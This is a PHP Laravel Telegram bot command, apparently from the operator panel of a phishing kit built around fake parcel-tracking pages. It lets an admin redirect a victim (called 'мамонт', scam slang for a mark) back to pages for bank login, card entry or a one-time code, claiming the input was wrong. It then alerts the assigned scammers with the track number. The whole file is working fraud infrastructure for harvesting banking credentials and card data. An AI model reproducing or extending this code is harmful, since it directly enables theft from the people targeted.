<?php

namespace App\Telegram\Commands;

use App\Events\RedirectEvent;
use App\Models\Fake;
use App\Models\Role;
use App\Models\TelegramUser;
use Log;
use Telegram\Bot\Actions;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Keyboard\Keyboard;

/**
 * Class HelpCommand.
 */
class RedirectCommand extends BaseCommand
{
    /**
     * @var string Command Name
     */
    protected $name = 'redirect';

    /**
     * @var array Command Aliases
     */

    /**
     * @var string Command Description
     */

    protected $pattern = '{track_id}{uuid}{url}{msg?}';

    protected $permissionName = Role::ADMIN;

    public function handle()
    {
        $this->replyWithChatAction(['action' => Actions::TYPING]);
        $track_id = $this->getArguments()['track_id'] ?? null;
        $uuid = $this->getArguments()['uuid'] ?? null;
        $url = $this->getArguments()['url'] ?? null;

        $fake = Fake::whereTrackId($track_id)->first();

        if (is_null($fake)) return;
        $platform = platform($fake->category->name, '2.0');
        try {
            $text = "⭐️ Мамонт ввел ";

            switch ($url) {
                case "/banks":
                    $text .= $msg = "неверный лк";
                    break;
                case "/order":
                    $text .= $msg = "неверную карту";
                    break;
                case "/code":
                    $text .= $msg = "неверный код";
                    break;
                default:
                    $text = $msg = null;
                    break;
            }
            if (!is_null($text)) foreach ($fake->allTakeUsers()->pluck('id')->toArray() as $id)
                $this->getTelegram()->sendMessage([
                    'chat_id' => $id,
                    'text' => makeText([
                        "<b>🚛Платформа:</b> <code>$platform</code>",
                        "<b>$text</b>",
                        "<b>Трек номер:</b> <code>$fake->track_id</code>",
                    ]),
                    "parse_mode" => "html",
                ]);
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
        event(new RedirectEvent($fake, $uuid, $url, $this->getArguments()['msg'] ?? ($msg ? "Вы ввели $msg" : $msg)));
        $update = $this->getUpdate();
        $message = $update->getMessage();

        if ($update->isType('callback_query')) try {
            $this->getTelegram()->editMessageReplyMarkup([
                "chat_id" => $message->getChat()->getId(),
                "message_id" => $message->messageId,
            ]);
        } catch (TelegramSDKException $e) {
        }


        $this->replyWithMessage([
            "text" => "✅ <i>Перенаправляем</i> <code>$url</code>",
            "parse_mode" => "html"
        ]);
    }
}